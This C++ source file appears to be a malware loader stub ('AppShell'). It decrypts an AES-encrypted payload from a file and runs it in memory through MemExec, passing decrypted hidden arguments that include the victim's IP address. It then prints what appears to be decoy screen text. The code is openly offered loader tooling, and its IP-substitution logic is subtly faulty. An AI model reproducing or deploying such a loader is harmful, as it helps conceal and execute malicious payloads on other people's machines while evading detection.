// AppShell.cpp
//

#include <iostream>
#include <string>
#include <Crypto.h>
#include <Common.h>
#include "Config.h"
#include "MemExec.h"

using namespace Felidae;

char* makePayloadArgs(int argc, char** argv) {
    char* s = new char[1024];
    memset(s, 0, 1024);
    if (argc != 1) {
        for (int i = 1; i < argc; i++) {
            strcat_s(s, 1024, " ");
            strcat_s(s, 1024, argv[i]);
        }
    }
    else {
        char* decrypted = NULL;
        BOOL ok = Felidae::AES_CBC_Decrypt_String(
            ENCRYPTED_PAYLOAD_ARGS,
            &decrypted,
            AES_KEY
        );
        if (!ok) {
            log("failed to decrypt args %s\n", ENCRYPTED_PAYLOAD_ARGS);
            return NULL;
        }
        std::string dec(decrypted);
        size_t idx = dec.find("{IP}");
        if (idx != std::string::npos) {
            std::string sIpAddr;
            char ipAddr[20] = "";
            if (Felidae::GetIpAddrX(ipAddr, 20, 'x')) {
                sIpAddr = std::string(ipAddr);
            }
            else {
                sIpAddr = "unkonwn";
            }
            dec.replace(idx, sIpAddr.length(), sIpAddr);
        }

        strcat_s(s, 1024, " ");
        strcat_s(s, 1024, dec.c_str());
    }

    return s;
}

int main(int argc, char **argv)
{
    LPBYTE lpData = NULL;
    DWORD dwLen = 0;

    BOOL ok = Felidae::AES_CBC_Decrypt_From_File(
        ENCRYPTED_PAYLOAD,
        &lpData,
        &dwLen,
        AES_KEY
    );
    if (!ok) {
        log("failed to load payload %s\n", ENCRYPTED_PAYLOAD);
        return -1;
    }

    char* args = makePayloadArgs(argc, argv);
    // log("args: %s\n", args);

    MemExec(lpData, dwLen, args);

    delete[] args;
    delete[] lpData;
    log(SCREEN_TEXT);
}
